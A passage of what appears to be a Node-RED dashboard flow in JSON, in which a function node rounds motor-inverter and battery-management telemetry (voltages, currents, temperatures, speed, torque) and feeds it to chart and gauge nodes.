        "func": "var sigFigs = 2\n\nvar INV_Ref_Voltage_12_0 =\n{\n    topic: \"INV REF Voltage 12.0 (V)\",\n    payload: msg.payload[0].INV_Ref_Voltage_12_0\n}\ntry {\n    INV_Ref_Voltage_12_0.payload = INV_Ref_Voltage_12_0.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Ref_Voltage_5_0 =\n{\n    topic: \"INV REF Voltage 5.0 (V)\",\n    payload: msg.payload[0].INV_Ref_Voltage_5_0\n}\ntry {\n    INV_Ref_Voltage_5_0.payload = INV_Ref_Voltage_5_0.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Ref_Voltage_2_5 =\n{\n    topic: \"INV REF Voltage 2.5 (V)\",\n    payload: msg.payload[0].INV_Ref_Voltage_2_5\n}\ntry {\n    INV_Ref_Voltage_2_5.payload = INV_Ref_Voltage_2_5.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Ref_Voltage_1_5 =\n{\n    topic: \"INV REF Voltage 1.5 (V)\",\n    payload: msg.payload[0].INV_Ref_Voltage_1_5\n}\ntry {\n    INV_Ref_Voltage_1_5.payload = INV_Ref_Voltage_1_5.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Iq =\n{\n    topic: \"INV Iq (A)\",\n    payload: msg.payload[0].INV_Iq\n}\ntry {\n    INV_Iq.payload = INV_Iq.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Id =\n{\n    topic: \"INV Id (A)\",\n    payload: msg.payload[0].INV_Id\n}\ntry {\n    INV_Id.payload = INV_Id.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Vq_ff =\n{\n    topic: \"INV Vq FF (V)\",\n    payload: msg.payload[0].INV_Vq_ff\n}\ntry {\n    INV_Vq_ff.payload = INV_Vq_ff.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Vd_ff =\n{\n    topic: \"INV Vd FF (V)\",\n    payload: msg.payload[0].INV_Vd_ff\n}\ntry {\n    INV_Vd_ff.payload = INV_Vd_ff.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_VBC_Vq_Voltage =\n{\n    topic: \"INV Vbc-Vq Voltage (V)\",\n    payload: msg.payload[0].INV_VBC_Vq_Voltage\n}\ntry {\n    INV_VBC_Vq_Voltage.payload = INV_VBC_Vq_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_VAB_Vd_Voltage =\n{\n    topic: \"INV Vab-Vd Voltage (V)\",\n    payload: msg.payload[0].INV_VAB_Vd_Voltage\n}\ntry {\n    INV_VAB_Vd_Voltage.payload = INV_VAB_Vd_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Output_Voltage =\n{\n    topic: \"INV Output Voltage (V)\",\n    payload: msg.payload[0].INV_Output_Voltage\n}\ntry {\n    INV_Output_Voltage.payload = INV_Output_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_DC_Bus_Voltage =\n{\n    topic: \"INV DC Bus Voltage (V)\",\n    payload: msg.payload[0].INV_DC_Bus_Voltage\n}\ntry {\n    INV_DC_Bus_Voltage.payload = INV_DC_Bus_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_DC_Bus_Current =\n{\n    topic: \"INV DC Bus Current (A)\",\n    payload: msg.payload[0].INV_DC_Bus_Current\n}\ntry {\n    INV_DC_Bus_Current.payload = INV_DC_Bus_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Phase_C_Current =\n{\n    topic: \"INV Phase C Current (A)\",\n    payload: msg.payload[0].INV_Phase_C_Current\n}\ntry {\n    INV_Phase_C_Current.payload = INV_Phase_C_Current.payload.toFixed(sigFigs)\n} catch { }\n\nvar INV_Phase_B_Current =\n{\n    topic: \"INV Phase B Current (A)\",\n    payload: msg.payload[0].INV_Phase_B_Current\n}\ntry {\n    INV_Phase_B_Current.payload = INV_Phase_B_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Phase_A_Current =\n{\n    topic: \"INV Phase A Current (A)\",\n    payload: msg.payload[0].INV_Phase_A_Current\n}\ntry {\n    INV_Phase_A_Current.payload = INV_Phase_A_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Motor_Speed =\n{\n    topic: \"INV Motor Speed\",\n    payload: msg.payload[0].INV_Motor_Speed\n}\ntry {\n    INV_Motor_Speed.payload = INV_Motor_Speed.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Motor_Angle_Electrical =\n{\n    topic: \"INV Motor Angle Electrical (deg)\",\n    payload: msg.payload[0].INV_Motor_Angle_Electrical\n}\ntry {\n    INV_Motor_Angle_Electrical.payload = INV_Motor_Angle_Electrical.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Motor_Temp =\n{\n    topic: \"INV Motor Temperature (ºC)\",\n    payload: msg.payload[0].INV_Motor_Temp\n}\ntry {\n    INV_Motor_Temp.payload = INV_Motor_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Hot_Spot_Temp =\n{\n    topic: \"INV Hot Spot Temperature (ºC)\",\n    payload: msg.payload[0].INV_Hot_Spot_Temp\n}\ntry {\n    INV_Hot_Spot_Temp.payload = INV_Hot_Spot_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar inv_coolant_temperature =\n{\n    topic: \"INV Coolant Temperature\",\n    payload: msg.payload[0].inv_coolant_temperature\n}\ntry {\n    inv_coolant_temperature.payload = inv_coolant_temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_RTD2_Temperature =\n{\n    topic: \"INV rtd2 Temperature (ºC)\",\n    payload: msg.payload[0].INV_RTD2_Temperature\n}\ntry {\n    INV_RTD2_Temperature.payload = INV_RTD2_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_RTD1_Temperature =\n{\n    topic: \"INV rtd1 Temperature (ºC)\",\n    payload: msg.payload[0].INV_RTD1_Temperature\n}\ntry {\n    INV_RTD1_Temperature.payload = INV_RTD1_Temperature.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Control_Board_Temp =\n{\n    topic: \"INV Control Board Temperature (ºC)\",\n    payload: msg.payload[0].INV_Control_Board_Temp\n}\ntry {\n    INV_Control_Board_Temp.payload = INV_Control_Board_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Stall_Burst_Model_Temp =\n{\n    topic: \"INV Stall Burst Model Temperature (ºC)\",\n    payload: msg.payload[0].INV_Stall_Burst_Model_Temp\n}\ntry {\n    INV_Stall_Burst_Model_Temp.payload = INV_Stall_Burst_Model_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Gate_Driver_Board_Temp =\n{\n    topic: \"INV Gate Driver Board Temperature (ºC)\",\n    payload: msg.payload[0].INV_Gate_Driver_Board_Temp\n}\ntry {\n    INV_Gate_Driver_Board_Temp.payload = INV_Gate_Driver_Board_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Module_C_Temp =\n{\n    topic: \"INV Module C Temperature (ºC)\",\n    payload: msg.payload[0].INV_Module_C_Temp\n}\ntry {\n    INV_Module_C_Temp.payload = INV_Module_C_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Module_B_Temp =\n{\n    topic: \"INV Module B Temperature (ºC)\",\n    payload: msg.payload[0].INV_Module_B_Temp\n}\ntry {\n    INV_Module_B_Temp.payload = INV_Module_B_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Module_A_Temp =\n{\n    topic: \"INV Module A Temperature (ºC)\",\n    payload: msg.payload[0].INV_Module_A_Temp\n}\ntry {\n    INV_Module_A_Temp.payload = INV_Module_A_Temp.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Ia =\n{\n    topic: \"INV Diag Ia A\",\n    payload: msg.payload[0].INV_Diag_Ia\n}\ntry {\n    INV_Diag_Ia.payload = INV_Diag_Ia.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Ib =\n{\n    topic: \"INV Diag Ib (A)\",\n    payload: msg.payload[0].INV_Diag_Ib\n}\ntry {\n    INV_Diag_Ib.payload = INV_Diag_Ib.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Ic =\n{\n    topic: \"INV Diag Ic (A)\",\n    payload: msg.payload[0].INV_Diag_Ic\n}\ntry {\n    INV_Diag_Ic.payload = INV_Diag_Ic.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vdc =\n{\n    topic: \"INV Diag Vdc (V)\",\n    payload: msg.payload[0].INV_Diag_Vdc\n}\ntry {\n    INV_Diag_Vdc.payload = INV_Diag_Vdc.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Iq_cmd =\n{\n    topic: \"INV Diag Iq CMD (A)\",\n    payload: msg.payload[0].INV_Diag_Iq_cmd\n}\ntry {\n    INV_Diag_Iq_cmd.payload = INV_Diag_Iq_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Id_cmd =\n{\n    topic: \"INV Diag Id CMD (A)\",\n    payload: msg.payload[0].INV_Diag_Id_cmd\n}\ntry {\n    INV_Diag_Id_cmd.payload = INV_Diag_Id_cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_FW_Output =\n{\n    topic: \"INV Diag FW Output (A)\",\n    payload: msg.payload[0].INV_Diag_FW_Output\n}\ntry {\n    INV_Diag_FW_Output.payload = INV_Diag_FW_Output.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vq_Cmd =\n{\n    topic: \"INV Diag Vq CMD (V)\",\n    payload: msg.payload[0].INV_Diag_Vq_Cmd\n}\ntry {\n    INV_Diag_Vq_Cmd.payload = INV_Diag_Vq_Cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vd_Cmd =\n{\n    topic: \"INV Diag Vd CMD (V)\",\n    payload: msg.payload[0].INV_Diag_Vd_Cmd\n}\ntry {\n    INV_Diag_Vd_Cmd.payload = INV_Diag_Vd_Cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_Vqs_Cmd =\n{\n    topic: \"INV Diag Vqs CMD (V)\",\n    payload: msg.payload[0].INV_Diag_Vqs_Cmd\n}\ntry {\n    INV_Diag_Vqs_Cmd.payload = INV_Diag_Vqs_Cmd.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Diag_PWM_Freq =\n{\n    topic: \"INV Diag PWM Freq\",\n    payload: msg.payload[0].INV_Diag_PWM_Freq\n}\ntry {\n    INV_Diag_PWM_Freq.payload = INV_Diag_PWM_Freq.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar BMS_Max_Discharge_Current =\n{\n    topic: \"BMS Max Discharge Current (A)\",\n    payload: msg.payload[0].BMS_Max_Discharge_Current\n}\ntry {\n    BMS_Max_Discharge_Current.payload = BMS_Max_Discharge_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar BMS_Max_Charge_Current =\n{\n    topic: \"BMS Max Charge Current (A)\",\n    payload: msg.payload[0].BMS_Max_Charge_Current\n}\ntry {\n    BMS_Max_Charge_Current.payload = BMS_Max_Charge_Current.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_Torque_Command =\n{\n    topic: \"INV Fast Torque Command (N*m)\",\n    payload: msg.payload[0].INV_Fast_Torque_Command\n}\ntry {\n    INV_Fast_Torque_Command.payload = INV_Fast_Torque_Command.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_Torque_Feedback =\n{\n    topic: \"INV Fast Torque Feedback (N*m)\",\n    payload: msg.payload[0].INV_Fast_Torque_Feedback\n}\ntry {\n    INV_Fast_Torque_Feedback.payload = INV_Fast_Torque_Feedback.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_Motor_Speed =\n{\n    topic: \"INV Fast Motor Speed (rpm)\",\n    payload: msg.payload[0].INV_Fast_Motor_Speed\n}\ntry {\n    INV_Fast_Motor_Speed.payload = INV_Fast_Motor_Speed.payload.toFixed(sigFigs)\n} catch { }\n\n\nvar INV_Fast_DC_Bus_Voltage =\n{\n    topic: \"INV Fast DC Bus Voltage (V)\",\n    payload: msg.payload[0].INV_Fast_DC_Bus_Voltage\n}\ntry {\n    INV_Fast_DC_Bus_Voltage.payload = INV_Fast_DC_Bus_Voltage.payload.toFixed(sigFigs)\n} catch { }\n\nreturn [\n    INV_Ref_Voltage_12_0,\n    INV_Ref_Voltage_5_0,\n    INV_Ref_Voltage_2_5,\n    INV_Ref_Voltage_1_5,\n    INV_Iq,\n    INV_Id,\n    INV_Vq_ff,\n    INV_Vd_ff,\n    INV_VBC_Vq_Voltage,\n    INV_VAB_Vd_Voltage,\n    INV_Output_Voltage,\n    INV_DC_Bus_Voltage,\n    INV_DC_Bus_Current,\n    INV_Phase_C_Current,\n    INV_Phase_B_Current,\n    INV_Phase_A_Current,\n    INV_Motor_Speed,\n    INV_Motor_Angle_Electrical,\n    INV_Motor_Temp,\n    INV_Hot_Spot_Temp,\n    inv_coolant_temperature,\n    INV_RTD2_Temperature,\n    INV_RTD1_Temperature,\n    INV_Control_Board_Temp,\n    INV_Stall_Burst_Model_Temp,\n    INV_Gate_Driver_Board_Temp,\n    INV_Module_C_Temp,\n    INV_Module_B_Temp,\n    INV_Module_A_Temp,\n    INV_Diag_Ia,\n    INV_Diag_Ib,\n    INV_Diag_Ic,\n    INV_Diag_Vdc,\n    INV_Diag_Iq_cmd,\n    INV_Diag_Id_cmd,\n    INV_Diag_FW_Output,\n    INV_Diag_Vq_Cmd,\n    INV_Diag_Vd_Cmd,\n    INV_Diag_Vqs_Cmd,\n    INV_Diag_PWM_Freq,\n    BMS_Max_Discharge_Current,\n    BMS_Max_Charge_Current,\n    INV_Fast_Torque_Command,\n    INV_Fast_Torque_Feedback,\n    INV_Fast_Motor_Speed,\n    INV_Fast_DC_Bus_Voltage\n];",
        "outputs": 46,
        "noerr": 0,
        "initialize": "",
        "finalize": "",
        "libs": [],
        "x": 560,
        "y": 400,
        "wires": [
            [
                "ee0b250d87f6e5dc"
            ],
            [
                "ee0b250d87f6e5dc"
            ],
            [
                "ee0b250d87f6e5dc"
            ],
            [
                "ee0b250d87f6e5dc"
            ],
            [
                "d6e7561d85bd11b6"
            ],
            [
                "d6e7561d85bd11b6"
            ],
            [
                "e5830f05dd4db39d"
            ],
            [
                "e5830f05dd4db39d"
            ],
            [
                "f49d99c6b0b02d77"
            ],
            [
                "f49d99c6b0b02d77"
            ],
            [
                "df772818309d0499"
            ],
            [
                "df772818309d0499"
            ],
            [
                "fe6b4a402ce856a1"
            ],
            [
                "b9c7ba040efde351"
            ],
            [
                "b9c7ba040efde351"
            ],
            [
                "b9c7ba040efde351"
            ],
            [
                "b9f24e1a1e8c3f28",
                "47c6f748f4e85402"
            ],
            [
                "87a044d28b25c583"
            ],
            [
                "054dd101e60dd310"
            ],
            [
                "054dd101e60dd310"
            ],
            [
                "054dd101e60dd310"
            ],
            [
                "e5570d33b861a9a3"
            ],
            [
                "e5570d33b861a9a3"
            ],
            [
                "eca90818fcfec8ba"
            ],
            [
                "df772818309d0499"
            ],
            [
                "eca90818fcfec8ba"
            ],
            [
                "1bcbe1efc015af9e"
            ],
            [
                "1bcbe1efc015af9e"
            ],
            [
                "1bcbe1efc015af9e"
            ],
            [
                "4f0eaf4ca2f9da7f"
            ],
            [
                "4f0eaf4ca2f9da7f"
            ],
            [
                "4f0eaf4ca2f9da7f"
            ],
            [
                "df772818309d0499"
            ],
            [
                "46e38c17f5ce0eaf"
            ],
            [
                "46e38c17f5ce0eaf"
            ],
            [
                "fe6b4a402ce856a1"
            ],
            [
                "d273f8164fbd84a6"
            ],
            [
                "d273f8164fbd84a6"
            ],
            [
                "df772818309d0499"
            ],
            [
                "d4d3ed9a1a436581"
            ],
            [
                "4ecafa0dd4a8b3d4"
            ],
            [
                "4ecafa0dd4a8b3d4"
            ],
            [
                "d32eece9a27aee39"
            ],
            [
                "d32eece9a27aee39"
            ],
            [
                "4504e0e644db03dd"
            ],
            [
                "df772818309d0499"
            ]
        ]
    },
    {
        "id": "d6e7561d85bd11b6",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 15,
        "width": "10",
        "height": 6,
        "label": "Iq and Id Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 60,
        "wires": [
            []
        ]
    },
    {
        "id": "e5830f05dd4db39d",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 12,
        "width": "10",
        "height": 6,
        "label": "Feedforward Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 840,
        "y": 100,
        "wires": [
            []
        ]
    },
    {
        "id": "f49d99c6b0b02d77",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 13,
        "width": "10",
        "height": 6,
        "label": "Voltage Between Phases",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 140,
        "wires": [
            []
        ]
    },
    {
        "id": "b9c7ba040efde351",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 20,
        "width": "10",
        "height": 6,
        "label": "Phase Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 1020,
        "y": 300,
        "wires": [
            []
        ]
    },
    {
        "id": "b9f24e1a1e8c3f28",
        "type": "ui_gauge",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 1,
        "width": "6",
        "height": "6",
        "gtype": "gage",
        "title": "Motor Speed",
        "label": "rpm",
        "format": "{{value}}",
        "min": 0,
        "max": "32767",
        "colors": [
            "#00b500",
            "#e6e600",
            "#ca3838"
        ],
        "seg1": "",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 810,
        "y": 340,
        "wires": []
    },
    {
        "id": "054dd101e60dd310",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 5,
        "width": "10",
        "height": "6",
        "label": "Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 820,
        "y": 480,
        "wires": [
            []
        ]
    },
    {
        "id": "e5570d33b861a9a3",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 7,
        "width": "10",
        "height": "6",
        "label": "RTD Input Temperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 520,
        "wires": [
            []
        ]
    },
    {
        "id": "1bcbe1efc015af9e",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 6,
        "width": "10",
        "height": "6",
        "label": "Module Temperature",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 840,
        "y": 600,
        "wires": [
            []
        ]
    },
    {
        "id": "4f0eaf4ca2f9da7f",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 16,
        "width": "10",
        "height": "6",
        "label": "Diagnostic Phase Currents",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#e87722",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 860,
        "y": 680,
        "wires": [
            []
        ]
    },
    {
        "id": "46e38c17f5ce0eaf",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 18,
        "width": "10",
        "height": "6",
        "label": "Command Currents",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 720,
        "wires": [
            []
        ]
    },
    {
        "id": "d273f8164fbd84a6",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 17,
        "width": "10",
        "height": "6",
        "label": "Command Voltages",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 800,
        "wires": [
            []
        ]
    },
    {
        "id": "4ecafa0dd4a8b3d4",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 19,
        "width": "10",
        "height": "6",
        "label": "Max BMS Current",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 830,
        "y": 920,
        "wires": [
            []
        ]
    },
    {
        "id": "4504e0e644db03dd",
        "type": "ui_gauge",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 2,
        "width": "6",
        "height": "6",
        "gtype": "gage",
        "title": "Motor Speed Max",
        "label": "rpm",
        "format": "{{value}}",
        "min": 0,
        "max": "32767",
        "colors": [
            "#00b500",
            "#e6e600",
            "#ca3838"
        ],
        "seg1": "",
        "seg2": "",
        "diff": false,
        "className": "",
        "x": 830,
        "y": 960,
        "wires": []
    },
    {
        "id": "eca90818fcfec8ba",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 8,
        "width": "10",
        "height": "6",
        "label": "Board Temeperatures",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 840,
        "y": 560,
        "wires": [
            []
        ]
    },
    {
        "id": "87a044d28b25c583",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 9,
        "width": "10",
        "height": "6",
        "label": "Motor Angle (Electrical)",
        "chartType": "line",
        "legend": "false",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#aec7e8",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 850,
        "y": 440,
        "wires": [
            []
        ]
    },
    {
        "id": "df772818309d0499",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 10,
        "width": "10",
        "height": "6",
        "label": "Voltages (Other)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
        "useUTC": false,
        "colors": [
            "#ffb81c",
            "#0081a6",
            "#ff7f0e",
            "#2ca02c",
            "#98df8a",
            "#d62728",
            "#ff9896",
            "#9467bd",
            "#c5b0d5"
        ],
        "outputs": 1,
        "useDifferentColor": false,
        "className": "",
        "x": 820,
        "y": 260,
        "wires": [
            []
        ]
    },
    {
        "id": "fe6b4a402ce856a1",
        "type": "ui_chart",
        "z": "4a2f2f6c3794d699",
        "name": "",
        "group": "4dce402db33a1ac6",
        "order": 14,
        "width": "10",
        "height": "6",
        "label": "Currents (Others)",
        "chartType": "line",
        "legend": "true",
        "xformat": "HH:mm:ss",
        "interpolate": "linear",
        "nodata": "",
        "dot": false,
        "ymin": "",
        "ymax": "",
        "removeOlder": "5",
        "removeOlderPoints": "",
        "removeOlderUnit": "60",
        "cutout": 0,
        "useOneColor": false,
